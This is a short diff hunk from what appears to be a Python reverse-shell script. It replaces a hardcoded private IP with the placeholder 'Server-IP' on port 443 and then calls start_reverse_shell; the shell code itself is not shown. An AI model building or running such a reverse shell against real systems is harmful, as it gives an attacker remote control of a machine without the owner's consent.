@@ -36,7 +36,7 @@ def start_reverse_shell(ip_address, port):
         print("Error:", e)
 
 # Specify the target IP address and port
-target_ip_address = "172.17.53.110"
+target_ip_address = "Server-IP"
 target_port = 443
 
 # Start the reverse shell
